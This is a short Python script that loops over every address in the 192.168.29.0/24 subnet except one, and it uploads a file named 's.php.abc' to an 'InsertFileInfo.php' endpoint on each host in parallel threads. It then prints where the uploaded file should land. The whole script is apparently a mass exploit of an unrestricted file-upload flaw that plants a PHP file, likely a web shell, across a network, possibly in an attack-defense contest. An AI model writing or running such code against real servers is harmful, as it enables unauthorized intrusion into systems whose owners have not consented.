import httplib
import requests
import sys
import threading

def httt(h):
	u='http://'+str(h)+'/InsertFileInfo.php'
	d=None
	try:
		f={'myfile' : open('/root/s.php.abc','rb')}
		r=requests.post(u,data=d,files=f)
		print(r.content)
		print(h+'/uploadedfile/s.php.abc')
	except Exception as e:
		sys.exit()

if __name__ == '__main__':
	a=1
	while a<=254:
		h='192.168.29.'+str(a)
		if h != '192.168.29.12':
			t=threading.Thread(target=httt,args=(h,))
			t.start()
		a=a+1